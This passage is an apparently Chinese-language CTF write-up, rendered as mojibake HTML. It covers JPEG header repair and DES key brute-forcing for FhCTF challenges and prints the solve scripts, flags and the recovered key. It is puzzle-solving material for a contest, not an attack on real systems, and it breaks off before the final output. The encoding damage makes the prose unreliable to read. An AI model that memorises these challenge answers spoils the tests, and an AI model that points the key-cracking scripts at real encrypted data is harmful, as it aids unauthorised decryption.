class="string">&quot;æ­£åœ¨å»ºç«‹ç´¢å¼•åºåˆ—...&quot;</span>)</span><br><span class="line">    index_list = build_index_sequence(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 3: è§£å¯†</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨è§£å¯†...&quot;</span>)</span><br><span class="line">    plaintext_mod = decrypt_tokens(tokens, index_list)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 4: è½‰æ›ç‚º ASCII è—è¡“</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨è½‰æ›ç‚º ASCII è—è¡“...&quot;</span>)</span><br><span class="line">    ascii_art = convert_to_ascii_art(plaintext_mod)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 5: æ¸²æŸ“æˆåœ–ç‰‡</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨æ¸²æŸ“åœ–ç‰‡...&quot;</span>)</span><br><span class="line">    result_path = render_ascii_art_to_image(ascii_art, output_file)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å®Œæˆï¼åœ–ç‰‡å·²å„²å­˜è‡³: <span class="subst">&#123;result_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nASCII è—è¡“é è¦½:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ascii_art[:<span class="number">500</span>] + <span class="string">&quot;...&quot;</span> <span class="keyword">if</span> <span class="built_in">len</span>(ascii_art) &gt; <span class="number">500</span> <span class="keyword">else</span> ascii_art)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/img/FhCTF/33.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;S1mpl3_FL46_We4k_P4ss&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DES-Lv-1-è€èˆ¹é•·çš„å¯¶è—"><a href="#DES-Lv-1-è€èˆ¹é•·çš„å¯¶è—" class="headerlink" title="DES Lv.1 - è€èˆ¹é•·çš„å¯¶è—"></a>DES Lv.1 - è€èˆ¹é•·çš„å¯¶è—</h3><ul>
<li><p>Part 1: JPEG é«˜åº¦ä¿®å¾© (Image Forensics)</p>
<ul>
<li><p>é¡Œç›®åˆ†æ</p>
<p>  <strong>ç›®æ¨™æª”æ¡ˆ</strong>: <code>treasuremap.webp</code><br>  <strong>ç¾è±¡</strong>: åœ–ç‰‡åº•éƒ¨è¢«æˆªæ–·ï¼Œç„¡æ³•çœ‹åˆ°å®Œæ•´å…§å®¹<br>  <strong>åŸå› </strong>: JPEG æª”æ¡ˆçš„é«˜åº¦æ•¸å€¼åœ¨ Hex Header ä¸­è¢«æƒ¡æ„ä¿®æ”¹ï¼Œå°è‡´ç€è¦½å™¨åªæ¸²æŸ“ä¸ŠåŠéƒ¨åˆ†ï¼Œåº•éƒ¨çš„é—œéµè³‡è¨Šè¢«éš±è—[1]</p>
</li>
<li><p>æ ¸å¿ƒåŸç†</p>
<p>  JPEG æª”æ¡ˆæ ¼å¼ä½¿ç”¨ SOF (Start of Frame) å€å¡Šå„²å­˜åœ–ç‰‡å°ºå¯¸è³‡è¨Š ï¼š</p>
<p>  <strong>SOF æ¨™è¨˜</strong>: <code>FF C0</code> (Baseline DCT) æˆ– <code>FF C2</code> (Progressive DCT)<br>  <strong>çµæ§‹</strong>: <code>[FF C0] [é•·åº¦(2bytes)] [ç²¾åº¦(1byte)] [é«˜åº¦(2bytes)] [å¯¬åº¦(2bytes)]</code><br>  <strong>ä½å…ƒçµ„åº</strong>: Big-Endian (å¤§ç«¯åº)</p>
<p>  ç•¶é«˜åº¦è¢«äººç‚ºæ”¹å°æ™‚ï¼Œåœ–ç‰‡æª¢è¦–å™¨æœƒå¿½ç•¥è¶…å‡ºé«˜åº¦çš„åƒç´ è³‡æ–™ï¼Œä½†é€™äº›è³‡æ–™ä»å®Œæ•´ä¿ç•™åœ¨æª”æ¡ˆä¸­ã€‚åªè¦å°‡é«˜åº¦å€¼æ¢å¾©æˆ–èª¿å¤§ï¼Œéš±è—çš„å…§å®¹å°±æœƒé¡¯ç¤ºå‡ºä¾†</p>
</li>
<li><p>è…³æœ¬</p>
<p>  A. è®€å–èˆ‡æœå°‹ SOF æ¨™è¨˜</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;treasuremap.webp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœå°‹æ‰€æœ‰ SOF æ¨™è¨˜ (FF C0 æˆ– FF C2)</span></span><br><span class="line">matches = [m.start() <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">b&#x27;\xff[\xc0\xc2]&#x27;</span>, data)]</span><br></pre></td></tr></table></figure>

<p>  æ­¤æ­¥é©Ÿæ‰¾å‡ºæ‰€æœ‰å®šç¾©åœ–ç‰‡å°ºå¯¸çš„ Header ä½ç½®ã€‚ç”±æ–¼ JPEG å¯èƒ½åŒ…å«ç¸®åœ– (Thumbnail)ï¼Œå› æ­¤å¯èƒ½å­˜åœ¨å¤šå€‹ SOF å€å¡Š &#96;</p>
<p>  B. é–å®šä¸»åœ–ç‰‡</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">max_width = <span class="number">0</span></span><br><span class="line">target_idx = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sof_pos <span class="keyword">in</span> matches:</span><br><span class="line">    <span class="comment"># è·³éæ¨™è¨˜æœ¬èº« (2 bytes) å’Œé•·åº¦æ¬„ä½ (2 bytes) å’Œç²¾åº¦ (1 byte)</span></span><br><span class="line">    h_idx = sof_pos + <span class="number">5</span>  <span class="comment"># é«˜åº¦ä½ç½®</span></span><br><span class="line">    w_idx = sof_pos + <span class="number">7</span>  <span class="comment"># å¯¬åº¦ä½ç½®</span></span><br><span class="line"></span><br><span class="line">    h = struct.unpack(<span class="string">&quot;&gt;H&quot;</span>, data[h_idx:h_idx+<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line">    w = struct.unpack(<span class="string">&quot;&gt;H&quot;</span>, data[w_idx:w_idx+<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> w &gt; max_width:  <span class="comment"># æ‰¾å‡ºå¯¬åº¦æœ€å¤§çš„å€å¡Š</span></span><br><span class="line">        max_width = w</span><br><span class="line">        target_idx = h_idx</span><br></pre></td></tr></table></figure>

<p>  <code>&gt;H</code> è¡¨ç¤º Big-Endian Unsigned Shortï¼Œç¬¦åˆ JPEG è¦ç¯„ ã€‚ä¸»åœ–ç‰‡é€šå¸¸å…·æœ‰æœ€å¤§çš„å¯¬åº¦å°ºå¯¸</p>
<p>  C. ä¿®æ”¹é«˜åº¦ä¸¦å„²å­˜</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_height = <span class="number">2000</span>  <span class="comment"># è¨­å®šç‚ºè¶³å¤ å¤§çš„é«˜åº¦</span></span><br><span class="line">data[target_idx:target_idx+<span class="number">2</span>] = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, new_height)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;treasuremap_fixed.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure>

<p>  æˆåŠŸä¿®å¾©å¾Œï¼Œé–‹å•Ÿåœ–ç‰‡å³å¯çœ‹åˆ°åº•éƒ¨éš±è—çš„è³‡è¨Šï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li><code>plaintext.enc</code> æª”æ¡ˆæç¤º</li>
<li>éƒ¨åˆ† Key æç¤ºï¼š<code>r5K9</code></li>
</ul>
<p>  <img src="/img/FhCTF/34.webp" alt="{6ED9B10C-BFBE-4518-B8C4-EF7B5ABA8D9F}"></p>
</li>
</ul>
</li>
<li><p>Part 2: DES å¯†é‘°çˆ†ç ´ (Cryptography)</p>
<ul>
<li><p>é¡Œç›®èƒŒæ™¯</p>
<p>  <strong>åŠ å¯†æ¼”ç®—æ³•</strong>: DES (Data Encryption Standard)<br>  <strong>è¼¸å…¥æª”æ¡ˆ</strong>: <code>plaintext.enc</code> (hex ç·¨ç¢¼çš„å¯†æ–‡)<br>  <strong>å·²çŸ¥è³‡è¨Š</strong>:</p>
<ul>
<li>é¡Œç›®æç¤ºï¼šâ€<strong>The Data</strong> å¯ä»¥å¹«ä½ åŠ é€Ÿè§£å¯†â€</li>
<li>åœ°åœ–å³ä¸‹è§’ç´…å­—ï¼š<code>key éƒ¨åˆ†ï¼šr5K9</code></li>
</ul>
</li>
<li><p>åŠ å¯†æ¨¡å¼åˆ¤æ–·</p>
<p>  æª¢æŸ¥ <code>plaintext.enc</code> ç‰¹å¾µï¼š</p>
<ol>
<li>Hex å­—ä¸²é•·åº¦ç‚ºå¶æ•¸ â†’ å¯è½‰æ›ç‚º bytes</li>
<li>è½‰æ›å¾Œé•·åº¦æ˜¯ 8 çš„å€æ•¸ â†’ ç¬¦åˆ DES block size</li>
</ol>
<p>  ç”±æ–¼é¡Œç›®æœªæä¾› IV (Initialization Vector)ï¼Œä¸”é€™æ˜¯å…¥é–€ç´š CTF é¡Œç›®ï¼Œæ¨æ¸¬ä½¿ç”¨ <strong>DES-ECB æ¨¡å¼</strong> ã€‚[3]</p>
<p>  <strong>ECB ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li>ä¸éœ€è¦ IV</li>
<li>æ¯å€‹ block ç¨ç«‹åŠ å¯†&#x2F;è§£å¯†</li>
<li>ç›¸åŒæ˜æ–‡ block ç”¢ç”Ÿç›¸åŒå¯†æ–‡ block[3]</li>
</ul>
</li>
<li><p>å¯†é‘°çµæ§‹åˆ†æ</p>
<p>  DES å¯†é‘°å›ºå®šç‚º <strong>8 bytes</strong>ã€‚<br>  å·²çŸ¥å‰ 4 bytesï¼š<code>r5K9</code><br>  æœªçŸ¥å¾Œ 4 bytesï¼šéœ€è¦çˆ†ç ´</p>
<p>  <strong>å­—å…ƒé›†</strong>: è‹±æ–‡å¤§å°å¯« + æ•¸å­— &#x3D; 62 å€‹å­—å…ƒ<br>  <strong>çµ„åˆæ•¸</strong>: 62^4 &#x3D; 14,776,336 ç¨®å¯èƒ½</p>
</li>
</ul>
</li>
<li><p>åŠ é€Ÿç­–ç•¥</p>
<p>  é¡Œç›®æç¤º â€œThe Data can help you decrypt fasterâ€ æ„å‘³è‘—ï¼š</p>
<ul>
<li>ä¸éœ€è¦è§£å¯†æ•´å€‹æª”æ¡ˆ</li>
<li>åªè§£å¯†<strong>ç¬¬ä¸€å€‹ block (8 bytes)</strong> å³å¯é©—è­‰å¯†é‘°æ­£ç¢ºæ€§</li>
<li>åˆ©ç”¨å·²çŸ¥æ˜æ–‡æ”»æ“Š (Known-Plaintext Attack) çš„æ¦‚å¿µ</li>
</ul>
</li>
<li><p>è§£é¡Œè…³æœ¬</p>
<p>  çˆ†ç ´ç‰ˆæœ¬</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®€å– hex å¯†æ–‡</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ct_hex = f.read().strip()</span><br><span class="line">ct = binascii.unhexlify(ct_hex)</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">b&quot;r5K9&quot;</span></span><br><span class="line">charset = (string.ascii_letters + string.digits).encode()</span><br><span class="line">ct0 = ct[:<span class="number">8</span>]  <span class="comment"># åªå–ç¬¬ä¸€å€‹ block</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_printable</span>(<span class="params">bs: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">or</span> b <span class="keyword">in</span> (<span class="number">10</span>, <span class="number">13</span>, <span class="number">9</span>) <span class="keyword">for</span> b <span class="keyword">in</span> bs)</span><br><span class="line"></span><br><span class="line">found = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> suf <span class="keyword">in</span> itertools.product(charset, repeat=<span class="number">4</span>):</span><br><span class="line">    key = prefix + <span class="built_in">bytes</span>(suf)</span><br><span class="line">    cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    pt0 = cipher.decrypt(ct0)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_printable(pt0) <span class="keyword">and</span> pt0.startswith(<span class="string">b&quot;Here is&quot;</span>):</span><br><span class="line">        found = key</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Key found: <span class="subst">&#123;key.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Key not found&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ‰¾åˆ°çš„å¯†é‘°è§£å¯†å®Œæ•´æª”æ¡ˆ</span></span><br><span class="line">cipher = DES.new(found, DES.MODE_ECB)</span><br><span class="line">pt = cipher.decrypt(ct)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç§»é™¤ PKCS7 padding</span></span><br><span class="line">pad = pt[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">8</span> <span class="keyword">and</span> pt.endswith(<span class="built_in">bytes</span>([pad]) * pad):</span><br><span class="line">    pt = pt[:-pad]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.dec.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(pt)</span><br></pre></td></tr></table></figure>

<p>  <strong>åŸ·è¡Œçµæœ</strong>:</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Key found: r5K9zXxv</span><br></pre></td></tr></table></figure>

<p>  ç›´æ¥è§£å¯†ç‰ˆæœ¬</p>
<p>  è‹¥å·²çŸ¥å®Œæ•´å¯†é‘°ï¼Œå¯ç›´æ¥è§£å¯†ï¼š</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = binascii.unhexlify(f.read().strip())</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;r5K9zXxv&quot;</span></span><br><span class="line">cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">plain = cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç§»é™¤ padding</span></span><br><span class="line">pad = plain[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">8</span> <span class="keyword">and</span> plain.endswith(<span class="built_in">bytes</span>([pad]) * pad):</span><br><span class="line">    plain = plain[:-pad]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.dec.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(plain)</span><br></pre></td></tr></table></figure>

<ul>
<li>çµæœ</li>
</ul>
<p>  æˆåŠŸè§£å¯†å¾Œçš„ <code>plaintext.dec.txt</code> å…§å®¹ï¼š</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Here is your reward for finding the right key:</span><br><span class="line">FhCTF&#123;D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DES-Lv-2-â€“-å†æ¢è€èˆ¹é•·çš„å¯¶è—ï¼ˆWrite-upï¼‰"><a href="#DES-Lv-2-â€“-å†æ¢è€èˆ¹é•·çš„å¯¶è—ï¼ˆWrite-upï¼‰" class="headerlink" title="DES Lv.2 â€“ å†æ¢è€èˆ¹é•·çš„å¯¶è—ï¼ˆWrite-upï¼‰"></a>DES Lv.2 â€“ å†æ¢è€èˆ¹é•·çš„å¯¶è—ï¼ˆWrite-upï¼‰</h3><ul>
<li><p>é¡Œç›®æè¿°èˆ‡ç·šç´¢æ•´ç†</p>
<p>  é¡Œç›®æç¤ºï¼š</p>
<ul>
<li>æœ‰ä¸€ä»½åŠ å¯†è³‡æ–™ï¼ˆ<code>plaintext.enc</code>ï¼‰</li>
<li>ä¸Šä¸€é¡Œ key æ›¾å‡ºç¾ <code>r5K9zXxv</code></li>
<li>åœ–ä¸Šé‚„æœ‰ <code>r5K9</code>ã€<code>A.D.1688</code></li>
<li>ä¸¦æ˜ç¢ºæç¤º <strong>â€œThe Data.â€ å¯ä»¥å¹«ä½ åŠ é€Ÿè§£å¯†</strong></li>
</ul>
<p>  ç›®æ¨™ï¼šè§£å‡ºå¯†æ–‡å…§å®¹ï¼Œæ‰¾åˆ° GPS åº§æ¨™æˆ– Flagã€‚</p>
</li>
<li><p>åˆæ­¥åˆ†æï¼šå¯†æ–‡æ ¼å¼èˆ‡ DES ç‰¹å¾µ</p>
<p>  æ‹¿åˆ° <code>plaintext.enc</code> å¾Œå…ˆåšæ ¼å¼åˆ¤æ–·ï¼š</p>
<ul>
<li>æª”æ¡ˆå…§å®¹çœ‹èµ·ä¾†åƒä¸€é•·ä¸² <strong>hex å­—å…ƒ</strong>ï¼ˆ<code>0-9a-f</code>ï¼‰</li>
<li>å› æ­¤éœ€å…ˆ <code>bytes.fromhex(...)</code> æ‰èƒ½å¾—åˆ°çœŸæ­£å¯†æ–‡ bytes</li>
<li>DES block size &#x3D; 8 bytesï¼Œå› æ­¤å¯†æ–‡é•·åº¦æ‡‰è©²æ˜¯ 8 çš„å€æ•¸ï¼ˆç”¨æ–¼é©—è­‰è³‡æ–™åˆç†æ€§ï¼‰</li>
</ul>
<p>  ç¨‹å¼ä¸­å°æ‡‰è™•ç†ï¼š</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ct = <span class="built_in">bytes</span>.fromhex(f.read().decode(<span class="string">&quot;ascii&quot;</span>).strip())</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ”»æ“Šç­–ç•¥ï¼šçŒœ mode&#x2F;IV + çˆ†ç ´ key çµæ§‹</p>
<p>  DES é¡Œå¸¸è¦‹é™·é˜±ä¸æ˜¯åªåœ¨ keyï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li><p>mode å¯èƒ½æ˜¯ ECB &#x2F; CBC &#x2F; CFB &#x2F; OFBâ€¦</p>
</li>
<li><p>CBC éœ€è¦ IVï¼ŒIV å¯èƒ½æ˜¯ï¼š</p>
<ul>
<li>å›ºå®šå€¼ï¼ˆå…¨ 0ï¼‰</li>
<li>ç”±æç¤ºå­—ä¸²ï¼ˆä¾‹å¦‚ <code>&quot;The Data&quot;</code>ï¼‰æä¾›</li>
<li>ç›´æ¥æ”¾åœ¨å¯†æ–‡å‰ 8 bytesï¼ˆ<code>IV || CIPHERTEXT</code>ï¼‰</li>
</ul>
</li>
<li><p>key æœ‰å¯èƒ½ä¸æ˜¯ä½ ä»¥ç‚ºçš„ <code>r5K9????</code>ï¼Œä¹Ÿå¯èƒ½æ˜¯ <code>????r5K9</code></p>
</li>
</ul>
<p>  å› æ­¤æœ¬è§£æ³•æ¡ç”¨ï¼š</p>
<ul>
<li><p>(A) åŒæ™‚æ¸¬å¤šç¨®åŠ å¯†æƒ…å¢ƒï¼ˆschemesï¼‰</p>
<p>  åœ¨ <code>try_dump()</code> è£¡ä¸€æ¬¡æ¸¬å››ç¨®æœ€å¸¸è¦‹çµ„åˆï¼š</p>
<ol>
<li>CBC + IV &#x3D; <code>&quot;The Data&quot;</code></li>
<li>CBC + IV &#x3D; <code>00...00</code></li>
<li>CBC + IV &#x3D; <code>ct[:8]</code>ï¼ˆå¸¸è¦‹ <code>IV||C</code> æ ¼å¼ï¼‰</li>
<li>ECBï¼ˆä¸éœ€è¦ IVï¼‰</li>
</ol>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">schemes = [</span><br><span class="line">    (<span class="string">&quot;CBC_IV_TheData&quot;</span>, DES.MODE_CBC, <span class="string">b&quot;The Data&quot;</span>, ct),</span><br><span class="line">    (<span class="string">&quot;CBC_IV_zeros&quot;</span>,   DES.MODE_CBC, <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span>,  ct),</span><br><span class="line">    (<span class="string">&quot;CBC_IV_prefix&quot;</span>,  DES.MODE_CBC, ct[:<span class="number">8</span>],     ct[<span class="number">8</span>:]),</span><br><span class="line">    (<span class="string">&quot;ECB&quot;</span>,            DES.MODE_ECB, <span class="literal">None</span>,       ct),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

</li>
<li><p>(B) åŒæ™‚æ¸¬å¤šç¨® key çµæ§‹ï¼ˆkey structuresï¼‰</p>
<p>  ç”±æ–¼åœ–ä¸Šæœ‰ <code>r5K9</code>ï¼Œä¸Šä¸€é¡Œå®Œæ•´ key æœ‰ <code>zXxv</code>ï¼ˆ<code>r5K9zXxv</code>ï¼‰ï¼Œå› æ­¤å‡è¨­ key å¯èƒ½ç”±å›ºå®š 4 ç¢¼ + å¯çˆ† 4 ç¢¼çµ„æˆã€‚</p>
<p>  æ¸¬è©¦å…©å€‹ baseï¼ˆå¯è‡ªè¡Œæ“´å……ï¼‰ï¼š</p>
<ul>
<li><code>base = b&quot;r5K9&quot;</code></li>
<li><code>base = b&quot;zXxv&quot;</code></li>
</ul>
<p>  ä¸¦å°æ¯å€‹ base æ¸¬å…©ç¨®æ‹¼æ³•ï¼š</p>
<ul>
<li><code>base + suf</code>  â†’ <code>r5K9????</code></li>
<li><code>suf + base</code>  â†’ <code>????r5K9</code></li>
</ul>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bases = [<span class="string">b&quot;r5K9&quot;</span>, <span class="string">b&quot;zXxv&quot;</span>]</span><br><span class="line"></span><br><span class="line">keys = [</span><br><span class="line">    base + suf,</span><br><span class="line">    suf + base,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>çˆ†ç ´ç¯„åœï¼ˆcharset &#x2F; keyspaceï¼‰</p>
<p>  suffix ä½¿ç”¨å¸¸è¦‹å¯è¦‹å­—å…ƒé›†åˆï¼š</p>
<ul>
<li><code>a-zA-Z0-9</code> åŠ ä¸Šä¸€äº›å¸¸è¦‹ç¬¦è™Ÿ <code>_ - ! @ # .</code></li>
<li>ç›®çš„ï¼šæ¶µè“‹ CTF å¸¸ç”¨ key é¢¨æ ¼ï¼ŒåŒæ™‚é¿å…ä¸€æ¬¡æŠŠ printable å…¨å¡çˆ†é€ æˆæ™‚é–“å¤±æ§</li>
</ul>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">charset = (string.ascii_letters + string.digits + <span class="string">&quot;_-!@#.&quot;</span>).encode()</span><br></pre></td></tr></table></figure>

<p>  çˆ†ç ´ keyspace ç´„ç‚ºï¼š</p>
<ul>
<li>charset é•·åº¦ â‰ˆ 67</li>
<li>suffix 4 ç¢¼ â†’ <code>67^4 â‰ˆ 20,151,121</code></li>
</ul>
</li>
<li><p>å¿«é€Ÿåˆ¤æ–·æ˜¯å¦è§£å°ï¼ˆé¿å…æ¯æŠŠ key è§£å…¨æ–‡ï¼‰</p>
<p>  çˆ†ç ´æœ€æ…¢çš„åœ°æ–¹ä¸æ˜¯ã€Œè©¦ keyã€ï¼Œè€Œæ˜¯ã€Œæ¯æŠŠ key éƒ½è§£å®Œæ•´å¯†æ–‡ã€ã€‚<br>  å› æ­¤æ­¤è§£æ³•æ¡ç”¨<strong>å¿«é€Ÿéæ¿¾</strong>ï¼š</p>
<ul>
<li>(A) åªè§£å‰ 64 bytes ç•¶ head åšåˆ¤æ–·</li>
</ul>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">head = DES.new(key8, mode, iv=iv).decrypt(body[:<span class="number">64</span>])</span><br></pre></td></tr></table></figure>

<ul>
<li>(B) åˆ¤æ–· head æ˜¯å¦åƒç­”æ¡ˆ</li>
</ul>
<p>  ç”¨å…©ç¨®æ¢ä»¶ï¼š</p>
<ol>
<li><strong>GPS regex å‘½ä¸­</strong></li>
<li><strong>å¯è¦‹å­—å…ƒæ¯”ä¾‹é«˜</strong></li>
</ol>
<ul>
<li><p>GPS regex</p>
<p> æŠ“å¸¸è¦‹å°æ•¸åº§æ¨™æ ¼å¼ï¼š</p>
<ul>
<li><code>25.0330,121.5654</code></li>
<li><code>-33.86 151.21</code></li>
</ul>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gps_pat = re.<span class="built_in">compile</span>(<span class="string">rb&#x27;[-+]?\d&#123;1,3&#125;\.\d&#123;3,&#125;\s*[, ]\s*[-+]?\d&#123;1,3&#125;\.\d&#123;3,&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¯è¦‹å­—å…ƒæ¯”ä¾‹</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printable_ratio</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    good = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> b <span class="keyword">if</span> x <span class="keyword">in</span> <span class="string">b&quot;\n\r\t&quot;</span> <span class="keyword">or</span> <span class="number">32</span> &lt;= x &lt;= <span class="number">126</span>)</span><br><span class="line">    <span class="keyword">return</span> good / <span class="built_in">len</span>(b)</span><br></pre></td></tr></table></figure>

<p>  ç•¶ <code>gps_pat.search(head)</code> å‘½ä¸­æˆ– <code>printable_ratio(head) &gt; 0.92</code>ï¼Œæ‰æœƒè§£å…¨æ–‡ã€‚</p>
</li>
<li><p>æ‰¾ Flag çš„æ–¹å¼</p>
<p>  è‹¥é¡Œç›®ç›´æ¥æŠŠ Flag æ”¾åœ¨æ˜æ–‡ä¸­ï¼Œç¨‹å¼ä¹Ÿæœƒç”¨ regex æœå°‹ï¼š</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag_pat = re.<span class="built_in">compile</span>(<span class="string">rb&#x27;FhCTF\&#123;[^&#125;]&#123;1,100&#125;\&#125;&#x27;</span>, re.I)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><ol start="7">
<li>åŸ·è¡Œæ–¹å¼ï¼ˆWindows &#x2F; PowerShellï¼‰</li>
</ol>
<ul>
<li>å®‰è£å¥—ä»¶</li>
</ul>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python <span class="literal">-m</span> pip install pycryptodome</span><br></pre></td></tr></table></figure>

<ul>
<li>åŸ·è¡Œ</li>
</ul>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python slove.py</span><br></pre></td></tr></table></figure>

</li>
<li><ol start="8">
<li>ç­‰å¾…ç­‰å¾…æˆåŠŸè¼¸å‡ºåˆ¤è®€(å¤§æ¦‚å¾ˆä¹…</li>
</ol>
</li>
</ul>
<p>ç•¶æ‰¾åˆ°å€™é¸ keyï¼Œç¨‹å¼æœƒå°å‡ºï¼š</p>
<ul>
<li>å‘½ä¸­çš„ key èˆ‡ scheme</li>
<li>head å‰ 200 bytes</li>
<li>è‹¥æœ‰ï¼Œå°å‡º GPS &#x2F; Flag</li>
<li>ä»¥åŠ plaintext å‰ 500 bytes</li>
</ul>
<p>è¼¸å‡ºå¦‚ä¸‹ï¼š</p>
